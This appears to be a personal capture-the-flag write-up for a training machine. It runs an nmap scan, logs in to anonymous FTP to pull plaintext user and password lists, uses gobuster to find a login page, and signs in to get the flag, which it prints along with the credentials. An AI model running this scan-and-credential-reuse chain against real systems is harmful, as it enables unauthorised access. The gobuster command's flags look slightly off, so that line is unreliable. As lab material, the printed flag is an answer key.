Nmap scanning:
~~~
nmap 10.129.20.69 -sC -sV
~~~

~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-13 09:47 EDT
Nmap scan report for 10.129.20.69
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.74
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.04 seconds
~~~

~~~
ftp 10.129.20.69
~~~

Connected to 10.129.20.69.
220 (vsFTPd 3.0.3)
Name (10.129.20.69:subhash):**Anonymous**
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||41218|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.

~~~
ftp> get allowed.userlist
~~~

local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||46434|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |************************************************************************************************************************************************|    33       30.31 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.10 KiB/s)
~~~
ftp> get allowed.userlist.passwd
~~~

local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||44507|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |************************************************************************************************************************************************|    62       78.22 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (0.19 KiB/s)
~~~
allowedlist :
aron
pwnmeow
egotisticalsw
admin
~~~

~~~
alloweduserlist password:
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd

website in the ipaddress
![[corcodile webpage.png]]

use gobuster to subdomain enumuration

~~~

~~~
gobuster dir -d 10.129.20.69 -w
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
~~~

dir for directory
-w for file path
-x for extension
we use php extension because the webpage is bluid with php language

![[VirtualBox_kali_13_06_2023_23_41_25.png]]

after directory enumuration we find the dir login.php

![[VirtualBox_kali_13_06_2023_23_32_23.png]]

we login with the user id password find the ftp 

![[corcodile flag.png]]


flag:c7110277ac44d78b6a9fff2232434d16
finally got the flag!!!!!

reference:
https://patchthenet.com/articles/using-gobuster-to-find-hidden-web-content/
https://github.com/OJ/gobuster
